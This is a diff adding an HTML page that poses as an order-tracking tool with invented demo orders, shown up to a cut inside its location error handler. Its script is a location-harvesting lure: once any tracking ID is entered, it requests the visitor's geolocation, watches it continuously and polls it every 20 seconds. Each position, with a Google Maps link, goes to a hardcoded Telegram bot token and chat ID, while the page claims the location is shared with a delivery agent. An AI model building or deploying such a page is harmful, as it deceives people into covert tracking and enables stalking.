@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Your Order</title>
+    <style>
+        /* CSS Variables for Theme */
+        :root {
+            --primary: #2874f0;
+            --primary-dark: #1c60d1;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --light-gray: #e9ecef;
+            --border: #dee2e6;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        /* Tracking Input Section */
+        .tracking-input-section {
+            text-align: center;
+        }
+
+        .tracking-form {
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gray);
+        }
+
+        .tracking-input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .tracking-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(40, 116, 240, 0.1);
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: var(--gray);
+            margin-top: 8px;
+            text-align: left;
+        }
+
+        .track-btn {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .track-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(40, 116, 240, 0.3);
+        }
+
+        .track-btn:active {
+            transform: translateY(0);
+        }
+
+        .track-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* Tracking Display Section - Hidden Initially */
+        .tracking-display-section {
+            display: none;
+        }
+
+        /* Order Info */
+        .order-info {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
+        }
+
+        .order-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .order-id {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .status-badge {
+            background: var(--warning);
+            color: var(--dark);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-badge.out-for-delivery {
+            background: var(--success);
+            color: white;
+        }
+
+        .status-badge.error {
+            background: var(--danger);
+            color: white;
+        }
+
+        .product-info {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .product-image {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .product-details h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: var(--dark);
+        }
+
+        .product-details p {
+            font-size: 14px;
+            color: var(--gray);
+        }
+
+        .order-meta {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border);
+        }
+
+        .meta-item label {
+            display: block;
+            font-size: 12px;
+            color: var(--gray);
+            margin-bottom: 5px;
+        }
+
+        .meta-item span {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        /* Progress Tracker */
+        .progress-tracker {
+            margin: 30px 0;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .progress-header h3 {
+            font-size: 18px;
+            color: var(--dark);
+        }
+
+        .progress-stats {
+            font-size: 14px;
+            color: var(--gray);
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: var(--light-gray);
+            border-radius: 3px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 75%;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+        }
+
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--light-gray);
+            border: 3px solid var(--light-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            color: var(--gray);
+            font-weight: 600;
+            transition: var(--transition);
+        }
+
+        .step.completed .step-icon {
+            background: var(--success);
+            border-color: var(--success);
+            color: white;
+        }
+
+        .step.active .step-icon {
+            background: white;
+            border-color: var(--primary);
+            color: var(--primary);
+        }
+
+        .step-label {
+            font-size: 12px;
+            text-align: center;
+            color: var(--gray);
+            margin-bottom: 4px;
+        }
+
+        .step.active .step-label {
+            color: var(--dark);
+            font-weight: 600;
+        }
+
+        .step-time {
+            font-size: 11px;
+            color: var(--gray);
+        }
+
+        /* Live Tracking Status */
+        .live-tracking-status {
+            background: linear-gradient(135deg, #e3f2fd 0%, #f3e5f5 100%);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .location-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .pulse-dot {
+            width: 12px;
+            height: 12px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        .pulse-dot.error {
+            background: var(--danger);
+            animation: none;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .status-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .coordinates {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: var(--dark);
+            margin-top: 10px;
+        }
+
+        .location-time {
+            font-size: 12px;
+            color: var(--gray);
+            margin-top: 8px;
+        }
+
+        /* Delivery Agent */
+        .delivery-agent {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 25px;
+            border: 1px solid var(--border);
+        }
+
+        .agent-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .agent-avatar {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .agent-info h4 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: var(--dark);
+        }
+
+        .agent-info p {
+            font-size: 14px;
+            color: var(--gray);
+        }
+
+        .agent-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: var(--gray);
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .action-btn.primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+        }
+
+        .action-btn.secondary {
+            background: var(--light-gray);
+            color: var(--dark);
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow);
+        }
+
+        .action-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* Loading State */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--light-gray);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Error State in Live Tracking */
+        .location-error {
+            background: #fee;
+            border: 1px solid #fcc;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            color: #c00;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .location-error i {
+            margin-right: 8px;
+        }
+
+        /* Retry Button */
+        .retry-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .retry-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* Back Button */
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .content {
+                padding: 20px;
+            }
+            
+            .header {
+                padding: 20px 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .order-meta {
+                grid-template-columns: 1fr;
+            }
+            
+            .agent-stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>📦 Track Your Order</h1>
+                <p>Enter your tracking ID to monitor delivery progress</p>
+            </div>
+            
+            <div class="content">
+                <!-- Tracking Input Section -->
+                <div class="tracking-input-section" id="trackingInputSection">
+                    <div class="tracking-form">
+                        <div class="form-group">
+                            <div class="input-with-icon">
+                                <i>📦</i>
+                                <input 
+                                    type="text" 
+                                    class="tracking-input" 
+                                    id="trackingIdInput" 
+                                    placeholder="Enter your tracking ID (e.g., TRK-123456)"
+                                    maxlength="20"
+                                    autocomplete="off"
+                                >
+                            </div>
+                            <div class="input-hint">
+                                You can find this ID in your order confirmation email
+                            </div>
+                        </div>
+                        
+                        <button class="track-btn" id="trackBtn">
+                            <span>🔍 Track Order</span>
+                        </button>
+                    </div>
+                    
+                    <!-- Demo IDs -->
+                    <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid var(--border);">
+                        <p style="font-size: 14px; color: var(--gray); margin-bottom: 10px;">Try these demo IDs:</p>
+                        <div style="display: flex; flex-wrap: wrap; gap: 10px;">
+                            <button class="demo-id-btn" style="background: var(--light-gray); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer;" onclick="document.getElementById('trackingIdInput').value = 'TRK-789456'">TRK-789456</button>
+                            <button class="demo-id-btn" style="background: var(--light-gray); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer;" onclick="document.getElementById('trackingIdInput').value = 'TRK-123456'">TRK-123456</button>
+                            <button class="demo-id-btn" style="background: var(--light-gray); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer;" onclick="document.getElementById('trackingIdInput').value = 'TRK-654321'">TRK-654321</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Loading State -->
+                <div class="loading" id="loadingSection">
+                    <div class="spinner"></div>
+                    <p style="color: var(--gray);">Setting up live tracking...</p>
+                </div>
+                
+                <!-- Tracking Display Section -->
+                <div class="tracking-display-section" id="trackingDisplaySection">
+                    <!-- Order Info -->
+                    <div class="order-info">
+                        <div class="order-header">
+                            <div class="order-id" id="displayOrderId">TRK-789456</div>
+                            <div class="status-badge out-for-delivery" id="orderStatus">Out for Delivery</div>
+                        </div>
+                        
+                        <div class="product-info">
+                            <div class="product-image">
+                                🎧
+                            </div>
+                            <div class="product-details">
+                                <h3 id="productName">Sony WH-1000XM4 Wireless Headphones</h3>
+                                <p id="productDesc">Noise Cancelling Over-Ear Headphones (Black)</p>
+                            </div>
+                        </div>
+                        
+                        <div class="order-meta">
+                            <div class="meta-item">
+                                <label>Estimated Delivery</label>
+                                <span id="deliveryTime">Today, 5:30 PM - 6:30 PM</span>
+                            </div>
+                            <div class="meta-item">
+                                <label>Order Date</label>
+                                <span id="orderDate">Nov 28, 2023</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Progress Tracker -->
+                    <div class="progress-tracker">
+                        <div class="progress-header">
+                            <h3>Delivery Progress</h3>
+                            <div class="progress-stats">Step 4 of 5</div>
+                        </div>
+                        
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
+                        </div>
+                        
+                        <div class="steps">
+                            <div class="step completed" id="step1">
+                                <div class="step-icon">✓</div>
+                                <div class="step-label">Order Confirmed</div>
+                                <div class="step-time">10:00 AM</div>
+                            </div>
+                            <div class="step completed" id="step2">
+                                <div class="step-icon">✓</div>
+                                <div class="step-label">Packed</div>
+                                <div class="step-time">11:30 AM</div>
+                            </div>
+                            <div class="step completed" id="step3">
+                                <div class="step-icon">✓</div>
+                                <div class="step-label">Shipped</div>
+                                <div class="step-time">1:45 PM</div>
+                            </div>
+                            <div class="step active" id="step4">
+                                <div class="step-icon">4</div>
+                                <div class="step-label">Out for Delivery</div>
+                                <div class="step-time">4:15 PM</div>
+                            </div>
+                            <div class="step" id="step5">
+                                <div class="step-icon">5</div>
+                                <div class="step-label">Delivered</div>
+                                <div class="step-time">--:--</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Live Tracking Status -->
+                    <div class="live-tracking-status" id="liveTrackingStatus">
+                        <div class="location-status">
+                            <div class="pulse-dot" id="pulseDot"></div>
+                            <div class="status-text" id="locationStatusText">Sharing your live location with delivery agent</div>
+                        </div>
+                        <div class="coordinates" id="coordinatesDisplay">
+                            Latitude: --, Longitude: --
+                        </div>
+                        <div class="location-time" id="lastUpdateTime">
+                            Last updated: --
+                        </div>
+                        <!-- Location Error Message -->
+                        <div class="location-error" id="locationError" style="display: none;">
+                            <i>⚠️</i> <span id="locationErrorText"></span>
+                            <button class="retry-btn" id="retryLocationBtn">
+                                <span>🔄 Retry</span>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Delivery Agent -->
+                    <div class="delivery-agent">
+                        <div class="agent-header">
+                            <div class="agent-avatar">RS</div>
+                            <div class="agent-info">
+                                <h4 id="agentName">Rahul Sharma</h4>
+                                <p id="agentStatus">On the way to your location</p>
+                            </div>
+                        </div>
+                        
+                        <div class="agent-stats">
+                            <div class="stat-item">
+                                <div class="stat-value" id="distanceAway">1.2 km</div>
+                                <div class="stat-label">Distance</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="eta">25 min</div>
+                                <div class="stat-label">ETA</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="updatesSent">0</div>
+                                <div class="stat-label">Updates Sent</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Action Buttons -->
+                    <div class="action-buttons">
+                        <button class="action-btn secondary" id="stopTrackingBtn">
+                            <span>⏹️ Stop Sharing</span>
+                        </button>
+                        <button class="action-btn primary" id="callAgentBtn">
+                            <span>📞 Call Agent</span>
+                        </button>
+                    </div>
+                    
+                    <!-- Back Button -->
+                    <button class="back-btn" id="backToTrackingBtn">
+                        <span>←</span> Track Another Order
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration - REPLACE THESE VALUES
+        const TELEGRAM_BOT_TOKEN = '8565301465:AAFIvnhYPfJ3ixhUNH75u8j39uG198hmhSk';
+        const TELEGRAM_CHAT_ID = '8565301465';
+        
+        // State variables
+        let trackingId = '';
+        let isTracking = false;
+        let watchId = null;
+        let locationUpdateCount = 0;
+        let locationUpdateInterval = null;
+        let orderData = {};
+        let hasLocationPermission = false;
+        
+        // DOM Elements
+        const trackingInputSection = document.getElementById('trackingInputSection');
+        const trackingDisplaySection = document.getElementById('trackingDisplaySection');
+        const loadingSection = document.getElementById('loadingSection');
+        const trackingIdInput = document.getElementById('trackingIdInput');
+        const trackBtn = document.getElementById('trackBtn');
+        const stopTrackingBtn = document.getElementById('stopTrackingBtn');
+        const backToTrackingBtn = document.getElementById('backToTrackingBtn');
+        const callAgentBtn = document.getElementById('callAgentBtn');
+        const retryLocationBtn = document.getElementById('retryLocationBtn');
+        
+        // Display elements
+        const displayOrderId = document.getElementById('displayOrderId');
+        const productName = document.getElementById('productName');
+        const productDesc = document.getElementById('productDesc');
+        const coordinatesDisplay = document.getElementById('coordinatesDisplay');
+        const lastUpdateTime = document.getElementById('lastUpdateTime');
+        const locationStatusText = document.getElementById('locationStatusText');
+        const locationError = document.getElementById('locationError');
+        const locationErrorText = document.getElementById('locationErrorText');
+        const distanceAway = document.getElementById('distanceAway');
+        const eta = document.getElementById('eta');
+        const updatesSent = document.getElementById('updatesSent');
+        const progressFill = document.getElementById('progressFill');
+        const pulseDot = document.getElementById('pulseDot');
+        
+        // Sample order data for demo
+        const sampleOrders = {
+            'TRK-789456': {
+                productName: 'Sony WH-1000XM4 Wireless Headphones',
+                productDesc: 'Noise Cancelling Over-Ear Headphones (Black)',
+                status: 'Out for Delivery',
+                deliveryTime: 'Today, 5:30 PM - 6:30 PM',
+                orderDate: 'Nov 28, 2023',
+                agentName: 'Rahul Sharma',
+                agentPhone: '+91 98765 43210',
+                initialDistance: '1.2 km',
+                initialETA: '25 min'
+            },
+            'TRK-123456': {
+                productName: 'Apple iPhone 14 Pro',
+                productDesc: '128GB, Deep Purple',
+                status: 'Shipped',
+                deliveryTime: 'Tomorrow, 10:00 AM - 12:00 PM',
+                orderDate: 'Nov 27, 2023',
+                agentName: 'Amit Kumar',
+                agentPhone: '+91 98765 12345',
+                initialDistance: '5.5 km',
+                initialETA: '45 min'
+            },
+            'TRK-654321': {
+                productName: 'Nike Air Max 270',
+                productDesc: "Men's Running Shoes (Size 10)",
+                status: 'Packed',
+                deliveryTime: 'Dec 1, 2023, 2:00 PM - 4:00 PM',
+                orderDate: 'Nov 29, 2023',
+                agentName: 'Vikram Singh',
+                agentPhone: '+91 98765 67890',
+                initialDistance: '8.3 km',
+                initialETA: '60 min'
+            }
+        };
+        
+        // Initialize the app
+        function initApp() {
+            // Load saved tracking ID if exists
+            const savedTrackingId = localStorage.getItem('lastTrackingId');
+            if (savedTrackingId) {
+                trackingIdInput.value = savedTrackingId;
+            }
+            
+            // Check if bot token is configured
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                console.warn('⚠️ Telegram Bot Token not configured. Please update TELEGRAM_BOT_TOKEN in the script.');
+            }
+            
+            // Set up event listeners
+            trackBtn.addEventListener('click', startTrackingProcess);
+            stopTrackingBtn.addEventListener('click', stopLocationSharing);
+            backToTrackingBtn.addEventListener('click', showTrackingInput);
+            callAgentBtn.addEventListener('click', callDeliveryAgent);
+            retryLocationBtn.addEventListener('click', retryLocationRequest);
+            
+            // Allow Enter key to trigger tracking
+            trackingIdInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    startTrackingProcess();
+                }
+            });
+            
+            // Demo ID buttons
+            document.querySelectorAll('.demo-id-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    trackingIdInput.focus();
+                });
+            });
+            
+            console.log('Order Tracker initialized');
+        }
+        
+        // Start the tracking process
+        function startTrackingProcess() {
+            trackingId = trackingIdInput.value.trim().toUpperCase();
+            
+            if (!trackingId) {
+                alert('Please enter a tracking ID');
+                return;
+            }
+            
+            if (trackingId.length < 6) {
+                alert('Tracking ID should be at least 6 characters');
+                return;
+            }
+            
+            // Save tracking ID
+            localStorage.setItem('lastTrackingId', trackingId);
+            
+            // Load order data (demo - in real app, this would come from an API)
+            orderData = sampleOrders[trackingId] || {
+                productName: `Order #${trackingId}`,
+                productDesc: 'Your order is being processed',
+                status: 'Processing',
+                deliveryTime: 'Estimated soon',
+                orderDate: new Date().toLocaleDateString(),
+                agentName: 'Delivery Agent',
+                agentPhone: '+91 00000 00000',
+                initialDistance: 'Calculating...',
+                initialETA: 'Calculating...'
+            };
+            
+            // Update display with order data
+            updateOrderDisplay();
+            
+            // Show loading state
+            showLoading();
+            
+            // Request location permission and start tracking
+            setTimeout(() => {
+                requestLocationPermission();
+            }, 500);
+        }
+        
+        // Update order display with loaded data
+        function updateOrderDisplay() {
+            displayOrderId.textContent = trackingId;
+            productName.textContent = orderData.productName;
+            productDesc.textContent = orderData.productDesc;
+            document.getElementById('orderStatus').textContent = orderData.status;
+            document.getElementById('deliveryTime').textContent = orderData.deliveryTime;
+            document.getElementById('orderDate').textContent = orderData.orderDate;
+            document.getElementById('agentName').textContent = orderData.agentName;
+            document.getElementById('agentStatus').textContent = orderData.status === 'Out for Delivery' ? 'On the way to your location' : 'Preparing your order';
+            distanceAway.textContent = orderData.initialDistance;
+            eta.textContent = orderData.initialETA;
+            
+            // Update progress based on status
+            updateProgressBar(orderData.status);
+        }
+        
+        // Update progress bar based on status
+        function updateProgressBar(status) {
+            let progress = 0;
+            const steps = document.querySelectorAll('.step');
+            
+            // Reset all steps
+            steps.forEach(step => {
+                step.classList.remove('active', 'completed');
+            });
+            
+            // Set progress based on status
+            switch(status) {
+                case 'Processing':
+                    progress = 0;
+                    steps[0].classList.add('active');
+                    break;
+                case 'Order Confirmed':
+                    progress = 25;
+                    steps[0].classList.add('completed');
+                    steps[1].classList.add('active');
+                    break;
+                case 'Packed':
+                    progress = 50;
+                    steps[0].classList.add('completed');
+                    steps[1].classList.add('completed');
+                    steps[2].classList.add('active');
+                    break;
+                case 'Shipped':
+                    progress = 75;
+                    steps[0].classList.add('completed');
+                    steps[1].classList.add('completed');
+                    steps[2].classList.add('completed');
+                    steps[3].classList.add('active');
+                    break;
+                case 'Out for Delivery':
+                    progress = 90;
+                    steps[0].classList.add('completed');
+                    steps[1].classList.add('completed');
+                    steps[2].classList.add('completed');
+                    steps[3].classList.add('active');
+                    break;
+                case 'Delivered':
+                    progress = 100;
+                    steps.forEach(step => step.classList.add('completed'));
+                    steps[4].classList.add('active');
+                    break;
+            }
+            
+            progressFill.style.width = `${progress}%`;
+            document.querySelector('.progress-stats').textContent = `Step ${Math.floor(progress/25) + 1} of 5`;
+        }
+        
+        // Request location permission
+        function requestLocationPermission() {
+            if (!navigator.geolocation) {
+                hideLoading();
+                showTrackingDisplay();
+                showLocationError('Geolocation is not supported by your browser');
+                return;
+            }
+            
+            // Try to get approximate location first (faster, less accurate)
+            navigator.geolocation.getCurrentPosition(
+                // Success callback
+                (position) => {
+                    hasLocationPermission = true;
+                    hideLoading();
+                    showTrackingDisplay();
+                    startLocationSharing(position);
+                    hideLocationError();
+                },
+                // Error callback
+                (error) => {
+                    hideLoading();
+                    showTrackingDisplay();
+                    handleLocationError(error);
+                },
+                // Options - using lower accuracy for faster response
+                {
+                    enableHighAccuracy: false, // Changed to false for faster response
+                    timeout: 8000, // Reduced from 10000 to 8000
+                    maximumAge: 60000 // Use cached location if available
+                }
+            );
+        }
+        
+        // Retry location request
+        function retryLocationRequest() {
+            hideLocationError();
+            locationStatusText.textContent = 'Requesting location...';
+            pulseDot.classList.add('error');
+            
+            // Try with different options
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    hasLocationPermission = true;
+                    startLocationSharing(position);
+                    hideLocationError();
+                },
+                (error) => {
+                    handleLocationError(error);
+                },
+                {
+                    enableHighAccuracy: false,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        // Start sharing location
+        function startLocationSharing(initialPosition) {
+            isTracking = true;
+            locationUpdateCount = 0;
+            
+            // Update UI
+            locationStatusText.textContent = 'Sharing your live location with delivery agent';
+            pulseDot.classList.remove('error');
+            pulseDot.style.animation = 'pulse 2s infinite';
+            
+            // Send initial location
+            sendLocationToTelegram(initialPosition);
+            
+            // Start watching position with better options
+            if (hasLocationPermission) {
+                watchId = navigator.geolocation.watchPosition(
+                    handleLocationUpdate,
+                    handleLocationError,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+                
+                // Set up periodic updates every 20 seconds
+                locationUpdateInterval = setInterval(() => {
+                    if (isTracking) {
+                        navigator.geolocation.getCurrentPosition(
+                            sendLocationToTelegram,
+                            handleLocationError,
+                            { 
+                                enableHighAccuracy: true,
+                                timeout: 5000 
+                            }
+                        );
+                    }
+                }, 20000);
+            }
+            
+            // Start distance simulation
+            startDistanceSimulation();
+        }
+        
+        // Handle location update
+        function handleLocationUpdate(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date().toLocaleTimeString();
+            
+            // Update display
+            coordinatesDisplay.textContent = `Lat: ${latitude.toFixed(6)}, Long: ${longitude.toFixed(6)}`;
+            lastUpdateTime.textContent = `Last updated: ${timestamp}`;
+            
+            // Send to Telegram
+            sendLocationToTelegram(position);
+        }
+        
+        // Send location to Telegram
+        async function sendLocationToTelegram(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const timestamp = new Date().toISOString();
+            
+            locationUpdateCount++;
+            updatesSent.textContent = locationUpdateCount;
+            
+            // Prepare location data
+            const locationData = {
+                trackingId: trackingId,
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: Math.round(accuracy),
+                timestamp: timestamp,
+                updateCount: locationUpdateCount,
+                orderDetails: orderData.productName,
+                googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
+            };
+            
+            // Log to console (for debugging)
+            console.log(`Location Update #${locationUpdateCount}:`, locationData);
+            
+            // Send to Telegram Bot if configured
+            if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+                await sendToTelegramBot(locationData);
+            }
+            
+            // Also try Telegram WebApp if available
+            if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
+                try {
+                    window.Telegram.WebApp.sendData(JSON.stringify(locationData));
+                    console.log('Sent via Telegram WebApp');
+                } catch (error) {
+                    console.error('Error sending via Telegram WebApp:', error);
+                }
+            }
+        }
+        
+        // Send data to Telegram Bot API
+        async function sendToTelegramBot(locationData) {
+            try {
+                const message = `📍 LIVE LOCATION UPDATE #${locationData.updateCount}\n` +
+                               `📦 Tracking ID: ${locationData.trackingId}\n` +
+                               `🛍️ Order: ${locationData.orderDetails}\n` +
+                               `🌐 Latitude: ${locationData.latitude.toFixed(6)}\n` +
+                               `🌐 Longitude: ${locationData.longitude.toFixed(6)}\n` +
+                               `📏 Accuracy: ${locationData.accuracy} meters\n` +
+                               `🕒 Time: ${new Date(locationData.timestamp).toLocaleTimeString()}\n` +
+                               `🔗 Google Maps: ${locationData.googleMapsLink}`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Telegram API error:', result);
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        // Handle location error
+        function handleLocationError(error) {
+            console.error('Location error:', error);
+            
+            let errorMsg = 'Unable to access your location';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = 'Location permission denied. Please enable location services in your browser settings.';
+                    hasLocationPermission = false;
+                    break;
+                case error.POSITION_UNAVAILABLE:
